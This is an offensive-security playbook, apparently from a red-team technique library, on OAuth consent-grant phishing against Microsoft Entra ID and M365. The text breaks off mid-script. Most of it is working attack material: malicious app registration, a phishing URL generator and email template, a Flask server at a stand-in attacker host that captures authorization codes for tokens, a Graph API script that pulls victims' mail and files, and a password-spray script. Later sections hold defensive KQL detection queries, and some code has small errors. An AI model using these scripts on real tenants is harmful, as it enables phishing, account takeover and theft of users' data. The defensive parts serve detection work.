# [IA-PHISH-002]: Consent Grant OAuth Attacks

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IA-PHISH-002 |
| **MITRE ATT&CK v18.1** | [T1566.002 - Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/) |
| **Tactic** | Initial Access |
| **Platforms** | Entra ID, M365 |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-10-21 |
| **Affected Versions** | All Entra ID versions (all Microsoft 365 subscription levels); Defender for Cloud Apps required for detection |
| **Patched In** | N/A (OAuth inherent design; mitigations via policy and detection only) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team) not included because no standardized Atomic test exists for OAuth consent phishing. All section numbers have been dynamically renumbered based on applicability.

---

## 1. EXECUTIVE SUMMARY

**Concept:** OAuth consent grant phishing (also known as "illicit consent grant" attacks) exploits the legitimate OAuth 2.0 authorization code grant flow by tricking users into granting permissions to malicious applications that appear legitimate. Unlike device code phishing (IA-PHISH-001), this attack does not require secret device codes or user input validation—attackers simply craft a phishing link pointing to Microsoft's real OAuth authorization endpoint with a malicious client ID. When the victim clicks the link, authenticates, and clicks "Accept" on the consent screen, the attacker receives an authorization code that can be exchanged for an access token, refresh token, and ID token. Once tokens are obtained, attackers can access the victim's emails, files, calendars, contacts, and other M365 resources indefinitely—even after password resets or MFA changes—because OAuth tokens bypass credential-based authentication.

**Attack Surface:** The attack leverages Microsoft's legitimate OAuth infrastructure and trust in first-party clients. No malicious payloads, domains, or server interactions are required beyond the initial phishing link delivery. Applications can be registered within the victim's own tenant (elevated privilege required but common in unhardened environments) or externally (easier but lower impact without admin consent bypass).

**Business Impact:** **Critical exposure and persistent breach.** This technique has been exploited by state-sponsored actors (Midnight Blizzard/APT29, Storm-2372), criminal groups (Tycoon 2FA phishing kit with 3,000+ compromised accounts in 2025), and is actively weaponized at scale. Once tokens are obtained, attackers maintain account-level access indefinitely, can exfiltrate all accessible data, perform lateral movement within M365 (Teams, SharePoint, Outlook forwarding rules), and—if admin consent is obtained—can compromise the entire tenant via backdoored applications. Tokens persist across password resets, MFA changes, and Conditional Access policy updates, making remediation extremely difficult.

**Technical Context:** OAuth consent phishing campaigns ramped significantly in 2025. Proofpoint reported over 900 M365 environments targeted with 3,000+ affected accounts and a 50%+ success rate. Risk-based step-up consent (enabled by default in Entra ID) partially mitigates the attack by requiring admin approval for apps without verified publishers, but attackers circumvent this via publisher verification spoofing, compromised legitimate accounts, and verified apps. Tokens can remain active for months before manual revocation occurs.

### Operational Risk

- **Execution Risk:** **Very Low** — Requires only a phishing email with a link; no technical complexity. Attacker creates app, crafts OAuth URL, sends email.
- **Stealth:** **Very High** — Operates entirely within legitimate OAuth flows; no suspicious commands, registry access, or malware execution. Detected only through behavioral log analysis.
- **Reversibility:** **No** — Once tokens are obtained and data is exfiltrated, cannot be undone. Requires credential revocation, app removal, and forensic investigation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1, 5.2, 5.3 | Lack of application governance, MFA enforcement, and Conditional Access policies enable unauthorized OAuth app access. |
| **DISA STIG** | AC-2, AC-3, SC-7 | Inadequate account management, access control, and boundary protection. |
| **CISA SCuBA** | AppM-1, IdM-1 | Weak application governance and identity management. |
| **NIST 800-53** | AC-2, AC-3, AC-6, SI-4, SI-12 | Account management, access enforcement, privilege restrictions, monitoring, information handling. |
| **GDPR** | Art. 32, 33 | Insufficient security measures; breach notification requirements. |
| **DORA** | Art. 9, 18 | ICT risk management and incident reporting. |
| **NIS2** | Art. 21, 23 | Cyber security measures and incident reporting. |
| **ISO 27001** | A.8.1.1, A.9.1.1, A.9.2.1 | User access management, access control, and authentication mechanisms. |
| **ISO 27005** | Risk Scenario: "Unauthorized Application Access" | Inadequate consent controls and application governance. |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**

- **Attacker Side (External OAuth App):** None required. Any attacker can register a multi-tenant application in their own Azure AD tenant at `portal.azure.com`.
- **Attacker Side (Internal OAuth App):** Requires a compromised account with "Application Developer" or equivalent role within the target organization.
- **Victim Side:** Any valid M365 user (no special permissions required).

**Required Access:**

- Victim must be able to access internet and Microsoft's OAuth authorization endpoints (`login.microsoftonline.com`).
- Attacker must be able to send emails, Teams messages, WhatsApp, or other communication channels to the victim.
- Attacker must host or control a redirect URI to collect authorization codes (can be attacker's own server or legitimate cloud storage with redirect).

**Supported Versions:**

- **Entra ID:** All versions; OAuth is core infrastructure.
- **M365 Applications:** All applications using OAuth 2.0 (Outlook, Teams, SharePoint, Graph API, OneDrive).
- **Operating Systems:** Platform-agnostic; executed via web browser.

**Tools & Environment:**

- Azure Portal (`portal.azure.com`) to register malicious application.
- OAuth URL generator (Python, Bash, or manual construction).
- Phishing email delivery infrastructure (compromised email account, commercial phishing service, or attacker-owned mail server).
- Web server or cloud storage to host redirect URI and collect authorization codes (optional; Microsoft-managed URIs can be used if attacking first-party apps).
- PowerShell or Python to exchange authorization codes for tokens using Microsoft's token endpoint.

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Detection of Suspicious OAuth Applications in Tenant

**Management Portal / PowerShell Reconnaissance:**

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Application.Read.All", "AppRoleAssignment.ReadWrite.Directory"

# List all registered applications (including malicious ones)
Get-MgApplication -All | `
  Select-Object DisplayName, AppId, CreatedDateTime, PublisherName, SignInAudience | `
  Where-Object { $_.CreatedDateTime -gt (Get-Date).AddDays(-7) } | `
  Format-Table

# Identify applications with Mail.Read, Files.Read, or offline_access permissions
Get-MgApplication -All | `
  ForEach-Object {
    $app = $_
    $perms = Get-MgApplicationRequiredResourceAccess -ApplicationId $app.Id
    
    if ($perms.ResourceAccess.Id -match "(Mail\.Read|Files\.Read|offline_access)") {
      Write-Host "[!] Risky app detected: $($app.DisplayName) (ID: $($app.AppId))"
      $perms | Select-Object -ExpandProperty ResourceAccess
    }
  }

# Identify applications with admin consent
Get-MgOauth2PermissionGrant -All | `
  Where-Object { $_.ConsentType -eq "AllPrincipals" } | `
  Select-Object ClientAppDisplayName, ResourceDisplayName, Scope | `
  Format-Table
```

**What to Look For:**

- **Newly created applications** (within last 7 days) with legitimate-sounding names (e.g., "SharePoint Integration", "Teams Helper", "Document Manager").
- **Applications requesting excessive permissions:** Mail.Read, Mail.ReadWrite, Files.Read, Calendars.Read, offline_access.
- **Multi-tenant applications** registered by external organizations (higher risk).
- **Applications without verified publishers** (unless verified badge is spoofed).
- **Applications with AllPrincipals consent** (admin-level access granted to all users in tenant).

**Cloud App Discovery:**

```powershell
# Query Entra ID audit logs for consent grants in past 24 hours
Connect-MgGraph -Scopes "AuditLog.Read.All"

Get-MgAuditLogDirectoryAudit -Filter "operationName eq 'Consent to application'" | `
  Where-Object { $_.CreatedDateTime -gt (Get-Date).AddHours(-24) } | `
  Select-Object CreatedDateTime, InitiatedByUserPrincipalName, TargetResources | `
  ForEach-Object {
    $consent = $_
    Write-Host "[*] Consent granted at $($consent.CreatedDateTime)"
    Write-Host "    User: $($consent.InitiatedByUserPrincipalName)"
    Write-Host "    App: $($consent.TargetResources[0].DisplayName)"
  }
```

**Verify OAuth Token Activity:**

```powershell
# Search for Graph API usage by newly created apps
Search-UnifiedAuditLog -Operations "Update OAuth2PermissionGrant", "Add OAuth2PermissionGrant" | `
  Where-Object { $_.CreatedDate -gt (Get-Date).AddDays(-7) } | `
  Select-Object UserIds, Operations, ResultIndex | `
  Export-Csv -Path "C:\Audit\oauth_grant_activity.csv"
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: External OAuth Phishing (Attacker-Registered Malicious Application)

**Supported Versions:** Entra ID all versions; M365 all subscription levels

**Scenario:** Attacker creates a malicious application in their own Azure AD tenant, configures it to request broad permissions (Mail.Read, offline_access), and sends a phishing link to victims in the target organization. Victims authenticate and grant consent, enabling the attacker to access their data indefinitely.

#### Step 1: Register Malicious Application in Attacker's Tenant

**Objective:** Create an OAuth application that will request victim's data access.

**Manual Steps (Azure Portal):**

1. Navigate to **Azure Portal** (`portal.azure.com`)
2. Go to **Entra ID** → **App registrations** → **+ New registration**
3. **Name:** `SharePoint Integration Helper` (appear legitimate)
4. **Supported account types:** Select `Accounts in any organizational directory (Multi-tenant)`
5. **Redirect URI:**
   - **Platform:** Web
   - **URI:** `https://attacker-server.com/auth/callback` (attacker-controlled server to collect authorization codes)
6. Click **Register**
7. Copy the **Application (client) ID** (e.g., `a1b2c3d4-e5f6-7890-abcd-ef1234567890`)

**PowerShell Alternative:**

```powershell
Connect-AzureAD -Credential (Get-Credential)

# Register the malicious application
$appRegistration = New-AzureADApplication `
  -DisplayName "SharePoint Integration Helper" `
  -PublicClient $false `
  -ReplyUrls @("https://attacker-server.com/auth/callback")

$appId = $appRegistration.AppId
Write-Host "[+] Application registered with ID: $appId"
```

#### Step 2: Configure OAuth Permissions

**Objective:** Request broad permissions that the application will request from victims.

**Manual Steps (Azure Portal):**

1. Go back to **App registrations** → Select your malicious app
2. Click **API permissions** → **+ Add a permission**
3. Select **Microsoft Graph**
4. Choose **Delegated permissions** (important: delegated, not application, because we want user-level access)
5. Search and add:
   - **Mail.Read** (read emails)
   - **Calendars.Read** (read calendar events)
   - **Files.Read** (read files in OneDrive/SharePoint)
   - **offline_access** (long-term access via refresh token)
   - **OpenID** (required for OIDC)
   - **profile** (user profile data)
6. Click **Add permissions**
7. Click **Grant admin consent for [Tenant]** (in attacker's tenant, not necessary; but done for testing)

**PowerShell Alternative:**

```powershell
# Add required permissions to the app
$requiredPermissions = @(
    @{
        ResourceAppId  = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph
        ResourceAccess = @(
            @{ Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"; Type = "Scope" }  # Mail.Read
            @{ Id = "37f7f235-527c-4136-accd-4a02d197296e"; Type = "Scope" }  # offline_access
            @{ Id = "14dad69e-099b-42c9-810b-d002981fedc1"; Type = "Scope" }  # Files.Read
        )
    }
)

Set-AzureADApplication -ObjectId $appRegistration.ObjectId -RequiredResourceAccess $requiredPermissions
```

**What This Means:**

- **Mail.Read:** Attacker can read all emails in victim's mailbox.
- **offline_access:** Attacker receives a refresh token, enabling long-term access even if victim logs out or changes password.
- **Delegated permissions:** Constrained to the victim's access level (not full tenant admin).

#### Step 3: Create Client Secret (Optional but Recommended)

**Objective:** Generate credentials for the attacker's backend to exchange authorization codes for tokens.

**Manual Steps (Azure Portal):**

1. Go to **App registrations** → Your malicious app → **Certificates & secrets**
2. Click **+ New client secret**
3. **Description:** `OAuth Token Exchange`
4. **Expires:** Select `24 months` (long-term access)
5. Click **Add**
6. **Copy the secret value immediately** (will not be shown again)

**Expected Output:**

```
Client Secret Value: 1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p_
```

**What This Means:**

- The client secret allows the attacker's backend to authenticate as the application when exchanging authorization codes for tokens.
- Without the secret, the attacker can only obtain user consent; with it, they can exchange codes for tokens autonomously.

#### Step 4: Craft Phishing OAuth URL

**Objective:** Generate a URL that, when clicked by the victim, initiates the OAuth authorization flow targeting the victim's organization.

**Python Script:**

```python
import urllib.parse
import uuid

# Attacker's OAuth details
client_id = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"  # Malicious app's client ID
tenant_id = "organizations"  # Multi-tenant (victim's tenant will be determined at sign-in)
redirect_uri = "https://attacker-server.com/auth/callback"
scope = "https://graph.microsoft.com/.default offline_access openid profile email"  # Broad permissions
state = str(uuid.uuid4())  # CSRF protection (not validated by most victims)

# Construct OAuth authorization URL
oauth_url = (
    f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/authorize?"
    f"client_id={urllib.parse.quote(client_id)}&"
    f"response_type=code&"
    f"redirect_uri={urllib.parse.quote(redirect_uri)}&"
    f"scope={urllib.parse.quote(scope)}&"
    f"state={state}&"
    f"response_mode=query&"
    f"login_hint=alice@targetorg.com"  # Pre-fill victim's email (optional but increases success)
)

print(f"[+] Phishing OAuth URL:")
print(oauth_url)

# Shorten URL for phishing campaign (e.g., bit.ly, tinyurl)
# Example shortened: https://bit.ly/oauth-sharepoint
```

**Phishing Email Template:**

```
Subject: Action Required: Update SharePoint Integration

Hi Alice,

Please click the link below to update your SharePoint Integration permissions. This is required to access shared documents.

[CLICK HERE TO UPDATE](https://bit.ly/oauth-sharepoint)

This usually takes less than 1 minute.

Thanks,
IT Support Team
```

**What This Means:**

- The URL points to Microsoft's legitimate OAuth endpoint (`login.microsoftonline.com`).
- The `client_id` parameter specifies the attacker's malicious application.
- The `redirect_uri` parameter specifies where the authorization code should be sent after the victim authenticates and grants consent.
- The `scope` parameter defines what permissions are requested (Mail.Read, offline_access, etc.).
- The `login_hint` parameter pre-fills the victim's email, reducing friction and increasing success rate.

#### Step 5: Send Phishing Campaign

**Objective:** Deliver the phishing URL to victims via email or messaging platforms.

**Email Delivery (Compromised Account):**

```powershell
# If attacker has compromised a legitimate internal account:
Send-MgUserMail -UserId "compromised-user@targetorg.com" `
  -Message @{
    Subject = "Action Required: Update SharePoint Integration"
    Body = @{
      ContentType = "HTML"
      Content = @"
      <p>Hi Alice,</p>
      <p>Please click the link below to update your SharePoint Integration permissions.</p>
      <p><a href='https://bit.ly/oauth-sharepoint'>CLICK HERE TO UPDATE</a></p>
      <p>This usually takes less than 1 minute.</p>
      <p>Thanks,<br>IT Support Team</p>
"@
    }
    ToRecipients = @(@{ EmailAddress = @{ Address = "alice@targetorg.com" } })
  }
```

**Mass Campaign (Using Tycoon 2FA Phishing Kit - 2025):**

Proofpoint identified phishing kits like "Tycoon 2FA" that:

1. Clone legitimate OAuth consent screens (SharePoint, DocuSign, Adobe, RingCentral).
2. Chain to AiTM phishing pages to harvest credentials and MFA codes.
3. Automatically generate OAuth applications and send phishing URLs at scale.
4. Track consent grants and token usage in real-time.

**Example Tycoon Campaign Metrics (2025):**

- **Targets:** 3,000+ user accounts across 900+ M365 environments
- **Success Rate:** 50%+
- **Impersonated Apps:** SharePoint, DocuSign, Adobe, RingCentral
- **Infrastructure:** Initially Russia-based proxies; shifted to US-based DCH in April 2025 to evade detection

#### Step 6: Collect Authorization Code from Victim

**Objective:** When victim clicks the link and grants consent, capture the authorization code.

**Victim's Browser Flow:**

```
1. Victim clicks phishing link
2. Microsoft's login page loads (legitimate)
3. Victim enters credentials (attacker captures if AiTM proxy used)
4. Microsoft prompts for consent:
   "SharePoint Integration Helper is requesting access to:"
   - Read your mail
   - Access your files
   - View your calendar
   - [ACCEPT] [CANCEL]
5. Victim clicks [ACCEPT]
6. Browser redirects to: https://attacker-server.com/auth/callback?code=M.R3_BAY...&session_state=abc123
```

**Attacker's Web Server (Node.js / Python):**

```python
from flask import Flask, request
import requests

app = Flask(__name__)

# Attacker's OAuth details
client_id = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
client_secret = "1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p_"
token_url = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"

@app.route("/auth/callback", methods=["GET"])
def oauth_callback():
    # Capture authorization code from redirect
    code = request.args.get("code")
    state = request.args.get("state")
    
    if not code:
        return "Error: No authorization code received", 400
    
    print(f"[+] Authorization code captured: {code[:50]}...")
    
    # Exchange code for access token
    token_payload = {
        "client_id": client_id,
        "client_secret": client_secret,
        "code": code,
        "redirect_uri": "https://attacker-server.com/auth/callback",
        "grant_type": "authorization_code",
        "scope": "https://graph.microsoft.com/.default offline_access openid profile"
    }
    
    token_response = requests.post(token_url, data=token_payload)
    token_data = token_response.json()
    
    if "access_token" in token_data:
        access_token = token_data["access_token"]
        refresh_token = token_data.get("refresh_token")
        
        print(f"[+] Tokens received!")
        print(f"    Access Token (first 50 chars): {access_token[:50]}...")
        print(f"    Refresh Token: {refresh_token[:50] if refresh_token else 'N/A'}...")
        
        # Save tokens to database for later use
        save_tokens_to_database(access_token, refresh_token)
        
        # Redirect victim to legitimate SharePoint to appear normal
        return redirect("https://sharepoint.microsoft.com")
    else:
        error = token_data.get("error")
        print(f"[!] Error exchanging code: {error}")
        return f"Error: {error}", 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, ssl_context="adhoc")
```

**What This Means:**

- Attacker captures the authorization code from the redirect.
- Attacker immediately exchanges the code for tokens using the client secret.
- Tokens are stored in the attacker's database for later use (data exfiltration, lateral movement, persistence).
- Victim is redirected to legitimate SharePoint to avoid suspicion.

#### Step 7: Exfiltrate Data Using Stolen Tokens

**Objective:** Use the access token to access victim's data via Microsoft Graph API.

**Python Script:**

```python
import requests
import json

access_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."  # Stolen token from victim
refresh_token = "0.ARQAv4J..."  # For long-term access

headers = {
    "Authorization": f"Bearer {access_token}",
    "Content-Type": "application/json"
}

print("[+] Exfiltrating victim's data...")

# 1. Extract emails
print("\n[*] Extracting emails...")
emails_url = "https://graph.microsoft.com/v1.0/me/messages?$top=100"
emails_response = requests.get(emails_url, headers=headers)
emails = emails_response.json()["value"]

for email in emails[:10]:  # First 10 emails
    print(f"    From: {email['from']['emailAddress']['address']}")
    print(f"    Subject: {email['subject']}")
    print(f"    Body Preview: {email['bodyPreview'][:100]}...")
    
    # Save email to attacker's server
    with open(f"exfil/{email['id']}.json", "w") as f:
        json.dump(email, f)

# 2. Search for sensitive information in emails
print("\n[*] Searching for sensitive keywords...")
sensitive_keywords = ["password", "credentials", "api key", "secret", "admin", "vpn", "teamviewer"]

for keyword in sensitive_keywords:
    search_url = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"{keyword}\""
    search_response = requests.get(search_url, headers=headers)
    matches = search_response.json()["value"]
    
    if matches:
        print(f"    [!] Found {len(matches)} emails with '{keyword}'")
        for match in matches[:3]:
            print(f"        - {match['subject']}")

# 3. Extract files from OneDrive
print("\n[*] Extracting files from OneDrive...")
files_url = "https://graph.microsoft.com/v1.0/me/drive/root/children"
files_response = requests.get(files_url, headers=headers)
files = files_response.json()["value"]

for file in files[:20]:
    if "folder" not in file:
        print(f"    - {file['name']} ({file['size']} bytes)")

# 4. Extract calendar events
print("\n[*] Extracting calendar events...")
calendar_url = "https://graph.microsoft.com/v1.0/me/calendar/events"
calendar_response = requests.get(calendar_url, headers=headers)
events = calendar_response.json()["value"]

for event in events[:10]:
    print(f"    - {event['subject']} ({event['start']['dateTime']})")

print("\n[+] Exfiltration complete. Data saved to attacker's server.")
```

**Expected Output:**

```
[+] Exfiltrating victim's data...

[*] Extracting emails...
    From: ceo@targetorg.com
    Subject: Q4 2025 Budget Approval - CONFIDENTIAL
    Body Preview: Alice, Please review the attached budget proposal. This is...

[!] Found 23 emails with 'password'
    - IT: Password Reset Procedure
    - Admin: Domain Admin Credentials
    - HR: New Employee Onboarding - temp password

[*] Extracting files from OneDrive...
    - Financial_Forecast_2025.xlsx (2.5 MB)
    - Customer_Database.csv (850 KB)
    - Executive_Strategy_Plan.docx (1.2 MB)
```

**What This Means:**

- Attacker has unrestricted access to victim's emails, files, calendar, and contacts.
- Sensitive information (passwords, admin details, financial data, credentials) can be harvested.
- Attacker can pivot to lateral movement (send internal phishing, create forwarding rules).
- Attacker can maintain long-term persistence via refresh token (valid for months).

---

### METHOD 2: Internal OAuth Phishing (Compromised Internal Account)

**Supported Versions:** Entra ID all versions; requires compromised internal account

**Scenario:** Attacker has compromised an internal user account (via password spray, credential stuffing, or initial breach). Attacker uses this account to create a malicious application INSIDE the victim's organization, then grants it broad permissions. Because the app is internal and created by a legitimate user, it bypasses risk-based step-up consent. Attacker then sends phishing emails from the compromised account to other users, requesting they grant consent to the malicious app.

#### Step 1: Compromise Internal User Account

**Objective:** Gain access to an internal user account.

**Tactics:**

- **Password Spray:** Target weak/default passwords (Password123, CompanyName2025, etc.)
- **Credential Stuffing:** Use previously leaked credentials from data breaches.
- **MFA Bypass:** If MFA is weak (TOTP on device, SMS interception), bypass via phishing.
- **Compromised Third-Party:** If user's personal email/password was breached elsewhere, reuse credentials.

**Example (Password Spray):**

```bash
#!/bin/bash
# Spray common passwords against target organization

TARGET_TENANT="target.onmicrosoft.com"
PASSWORDS=("Welcome123" "Password123" "Company2025" "SecurePass!" "Admin123")

for password in "${PASSWORDS[@]}"; do
  for user in alice john sarah admin; do
    UPN="${user}@${TARGET_TENANT}"
    
    # Attempt to authenticate via OAuth
    RESPONSE=$(curl -s -X POST "https://login.microsoftonline.com/organizations/oauth2/v2.0/token" \
      -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default&username=${UPN}&password=${password}&grant_type=password" \
      -H "Content-Type: application/x-www-form-urlencoded")
    
    if echo $RESPONSE | grep -q "access_token"; then
      echo "[+] SUCCESS: ${UPN} / ${password}"
      echo "$RESPONSE" > "${UPN}_tokens.json"
      break 2
    fi
  done
done
```

#### Step 2: Register Malicious Application as Internal User

**Objective:** Create an app that appears to be an internal tool.

**PowerShell (Using Compromised Account):**

```powershell
# Connect as compromised user
$cred = Get-Credential  # Compromised user's credentials
Connect-MgGraph -Scopes "Application.ReadWrite.All" -Credential $cred

# Register malicious app inside victim's tenant
$appRegistration = New-MgApplication `
  -DisplayName "Teams Notification Integration" `
  -Description "Internal integration for Teams notifications" `
  -PublicClient $false

$appId = $appRegistration.AppId
Write-Host "[+] App registered internally: $appId"

# Add permissions (Mail.Read, Files.Read, offline_access)
$requiredPermissions = @{
    ResourceAppId  = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph
    ResourceAccess = @(
        @{ Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"; Type = "Scope" }  # Mail.Read
        @{ Id = "37f7f235-527c-4136-accd-4a02d197296e"; Type = "Scope" }  # offline_access
    )
}

Update-MgApplication -ApplicationId $appId -RequiredResourceAccess @($requiredPermissions)

# Create client secret
$secret = Add-MgApplicationPassword -ApplicationId $appId -DisplayName "IntegrationSecret"
Write-Host "[+] Client Secret: $($secret.SecretText)"
```

#### Step 3: Grant Admin Consent (If Attacker is Admin)

**Objective:** If compromised account is an admin, grant app broad permissions automatically.

**PowerShell:**

```powershell
# Grant admin consent on behalf of all users
Update-MgApplicationRequiredResourceAccess -ApplicationId $appId

# Approve the consent
$clientId = (Get-MgApplication -ApplicationId $appId).AppId
$resourceId = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph

New-MgOauth2PermissionGrant `
  -ClientId $clientId `
  -ResourceId $resourceId `
  -ConsentType "AllPrincipals" `
  -Scope "Mail.Read Files.Read offline_access"
```

**What This Means:**

- If the compromised account has admin privileges, the attacker can automatically grant the malicious app broad permissions across the entire tenant.
- No user consent is required.
- All users in the organization can now be accessed via the app.

#### Step 4-7: (Same as METHOD 1 - Steps 4-7)

Attacker crafts phishing URL, sends to other users, collects tokens, and exfiltrates data.

---

## 5. TOOLS & COMMANDS REFERENCE

### [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)

**Version:** 2.0+  
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell 7.0+

**Installation:**

```powershell
Install-Module Microsoft.Graph -Scope CurrentUser
```

**Usage (Reconnaissance - for defenders):**

```powershell
# List all OAuth applications
Get-MgApplication -All | Select-Object DisplayName, AppId, CreatedDateTime

# Extract application permissions
Get-MgApplicationRequiredResourceAccess -ApplicationId "app-id" | Select-Object ResourceAccess
```

### [Azure PowerShell Cmdlets](https://learn.microsoft.com/en-us/powershell/azure/new-azureps-module-az)

**For application registration and consent management:**

```powershell
# Register application
New-AzureADApplication -DisplayName "Malicious App"

# Add permissions
New-AzureADApplicationKeyCredential -ObjectId "app-object-id"

# Grant consent
New-AzureADOAuth2PermissionGrant -ClientId "app-id" -ConsentType "AllPrincipals" -ResourceId "graph-id"
```

### [Python: requests + json](https://docs.python-requests.org/)

**For OAuth token exchange and Graph API access:**

```python
import requests
import json

# Exchange authorization code for tokens
token_response = requests.post(
    "https://login.microsoftonline.com/organizations/oauth2/v2.0/token",
    data={
        "client_id": "app-id",
        "client_secret": "app-secret",
        "code": "authorization-code",
        "grant_type": "authorization_code",
        "redirect_uri": "callback-url"
    }
)

tokens = token_response.json()
access_token = tokens["access_token"]

# Use access token to call Graph API
graph_response = requests.get(
    "https://graph.microsoft.com/v1.0/me/messages",
    headers={"Authorization": f"Bearer {access_token}"}
)
```

### [Tycoon 2FA Phishing Kit](https://www.proofpoint.com/us/blog/threat-insight/microsoft-oauth-app-impersonation-campaign-leads-mfa-phishing) (Criminal Tool)

**Capabilities:**

- Automates OAuth app creation
- Clones legitimate consent screens (SharePoint, DocuSign, Adobe)
- Chains to AiTM phishing for credential + MFA capture
- Tracks consent grants and token usage in real-time
- Supports bulk campaigns across 1000s of targets

**Infrastructure (2025 Campaign):**

- Initially hosted on Russia-based proxies
- Shifted to US-based data center hosting (DCH) in April 2025
- Impersonates 50+ legitimate applications
- Targets 3,000+ accounts across 900+ M365 environments with 50%+ success rate

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious OAuth Consent Grant to Risky Applications

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedByUserPrincipalName, TargetResources, Properties
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Entra ID all versions

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Consent to application"
| extend TargetApp = TargetResources[0].DisplayName, 
         AppId = tostring(TargetResources[0].id),
         GrantedScopes = extract_json("$.ConsentAction.Permissions", tostring(TargetResources[0].ModifiedProperties[0].NewValue))
| where GrantedScopes has_any ("Mail.Read", "Files.Read", "offline_access")
| where not(TargetResources[0].DisplayName has_any ("Microsoft Teams", "Visual Studio Code", "Azure CLI"))
| extend Publisher = tostring(TargetResources[0].DisplayName)
| where Publisher has_any ("helper", "integration", "sync", "share") or Parser has "^[A-Z]+ [A-Z]+" // suspicious naming
| project TimeGenerated, UserPrincipalName, TargetApp, AppId, GrantedScopes, IPAddress, UserAgent
| summarize GrantCount = count(), UniqueScopes = dcount(GrantedScopes) by UserPrincipalName, TargetApp, AppId
| where GrantCount > 1 or UniqueScopes > 3
```

**What This Detects:**

- Users granting consent to multiple applications requesting broad permissions (Mail.Read, Files.Read, offline_access).
- Applications with suspicious naming patterns (contains "helper", "integration", "sync").
- Consent grants for non-verified publishers.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Microsoft Sentinel** → **Analytics**
2. Click **+ Create** → **Scheduled query rule**
3. **Name:** `Suspicious OAuth Consent Grant to Risky Apps`
4. **Severity:** `High`
5. **Frequency:** `Every 5 minutes`
6. Paste the KQL query above
7. Configure **Incident settings:** Create incident per alert
8. Click **Review + create**

### Query 2: Admin Consent Granted to Multi-Tenant App

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Consent to application" or OperationName == "Add OAuth2PermissionGrant"
| extend TargetApp = TargetResources[0].DisplayName,
         ConsentType = extract_json("$.ConsentAction.IsAdminConsent", tostring(TargetResources[0].ModifiedProperties[0].NewValue)),
         Scopes = extract_json("$.ConsentAction.Permissions", tostring(TargetResources[0].ModifiedProperties[0].NewValue))
| where ConsentType has "true"  // Admin consent granted
| where Scopes has_any ("Directory.ReadWrite.All", "Mail.ReadWrite", "Sites.Manage.All")
| project TimeGenerated, InitiatedByUserPrincipalName, TargetApp, Scopes, OperationName
```

### Query 3: Rapid Consent Grants by Same User (Indicator of Compromise)

**KQL Query:**

```kusto
AuditLogs
| where OperationName == "Consent to application"
| project TimeGenerated, UserPrincipalName, TargetResources
| summarize GrantCount = count(), 
            FirstGrant = min(TimeGenerated), 
            LastGrant = max(TimeGenerated),
            GrantedApps = make_set(TargetResources[0].DisplayName)
            by UserPrincipalName
| where (LastGrant - FirstGrant) < 1h and GrantCount > 3  // 3+ grants in 1 hour = suspicious
| project UserPrincipalName, GrantCount, FirstGrant, LastGrant, GrantedApps
```

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 (Successful Logon) — Limited Relevance**

- **Trigger:** Interactive logon from browser to OAuth endpoint.
- **Filter:** Process contains "iexplore.exe", "chrome.exe", "msedge.exe" and username contains target UPN.
- **Applies To Versions:** Windows 10+

**Event ID: 4688 (Process Creation) — Limited Relevance**

- **Trigger:** If OAuth token exchange occurs on victim's machine (rare).
- **Filter:** CommandLine contains "authorization_code" or "access_token".
- **Applies To Versions:** Windows Server 2016+

**Note:** OAuth consent phishing is primarily a cloud-based attack; Windows event logs provide limited visibility. Focus on Entra ID and Purview logs instead.

---

## 8. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: OAuth Consent Grants and Application Creation

**Manual Configuration Steps (Enable Unified Audit Log):**

1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention

**PowerShell Query:**

```powershell
Connect-ExchangeOnline

# Search for OAuth consent grants in past 7 days
Search-UnifiedAuditLog `
  -StartDate (Get-Date).AddDays(-7) `
  -Operations "Consent to application", "Add OAuth2PermissionGrant", "Update OAuth2PermissionGrant" `
  -ResultSize 1000 | `
  Select-Object UserIds, Operations, CreatedDate, AuditData | `
  Export-Csv -Path "C:\Audit\oauth_consent.csv"

# Search for application creation
Search-UnifiedAuditLog `
  -StartDate (Get-Date).AddDays(-7) `
  -Operations "Add application", "Update application" `
  -ResultSize 1000 | `
  Select-Object UserIds, CreatedDate, AuditData | `
  Export-Csv -Path "C:\Audit\app_creation.csv"

# Parse and analyze
$auditData = Import-Csv "C:\Audit\oauth_consent.csv"
